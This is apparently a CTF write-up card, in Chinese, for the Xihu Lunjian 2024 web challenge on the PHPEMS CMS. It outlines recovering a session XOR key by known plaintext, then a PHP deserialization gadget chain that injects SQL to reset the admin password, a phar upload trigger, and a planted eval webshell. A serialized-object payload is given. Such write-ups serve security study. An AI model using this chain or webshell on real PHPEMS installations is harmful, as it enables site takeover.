---
title: "西湖论剑 2024/PHPEMS"
category: web
tags: ["西湖论剑", "web", "PHPEMS", "session 反序列化", "已知明文攻击", "还原 XOR key"]
signals: ["西湖论剑 2024", "PHPEMS", "session 反序列化", "已知明文攻击", "还原 XOR key", "二级 SQL 注入", "phar 文件上传触发", "deserialize", "phar", "sqli", "rce", "session", "XOR", "key"]
difficulty: medium
source: "https://www.ctfiot.com/160823.html"
tools: ["PHP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 西湖论剑 2024/PHPEMS

> 赛事：西湖论剑 2024 | 方向：web | 难度：medium | 工具：PHP

## 一句话总结

session 已知明文还原 XOR key + pop 链改 admin 密码 + 后台 phar 上传 RCE

## 攻击链

1. 定位 lib/strings.cls.php 的 decode 函数触发反序列化入口
2. 每次访问发 session：sessionid (md5) + sessionip (可控 XFF) + sessiontimelimit (时间戳)
3. encode/decode 用 32 字节 key 循环 XOR
4. substr($info, 64, 32) 提取已知明文段 'sessionip";s:9:"127.0.0.1";s:1
5. 写 reverse 脚本用 已知明文 XOR 密文 反推出 32 字节 key
6. 构造 session 命名空间 pop 链：session.__destruct → pdosql.makeUpdate → pepdo.exec
7. 注入 tablepre = 'x2_user set userpassword=md5(123) where username=peadmin;#--
8. 登录后台，文件上传 phar（GIF89a 头绕过）
9. 微信接口 file_get_contents 接受 phar:// 触发 phar 反序列化
10. 后台模板管理写入 @eval($_POST[1]) 拿 shell

## 关键 payload

```
namespace PHPEMS { class session { public function __construct() { $this->pdosql = new pdosql(); $this->db = new pepdo(); } } class pdosql { public function __construct() { $this->tablepre = 'x2_user set userpassword="e10adc3949ba59abbe56e057f20f883e" where username="peadmin";#--'; $this->db = new pepdo(); } } class pepdo { private $linkid = 0; } }
```

## 经验教训

PHP 自定义 session 加密可用已知明文 (client IP/time) 反推 key；PDO prepare 字符串拼接仍可注入；phar:// + file_get_contents 是经典 phar 反序列化触发点

## 标签

PHPEMS、session 反序列化、已知明文攻击、还原 XOR key、二级 SQL 注入、phar 文件上传触发

## 参考来源

- https://www.ctfiot.com/160823.html
- 原文件：2024西湖论剑-数据安全-PHPEMS.full.md
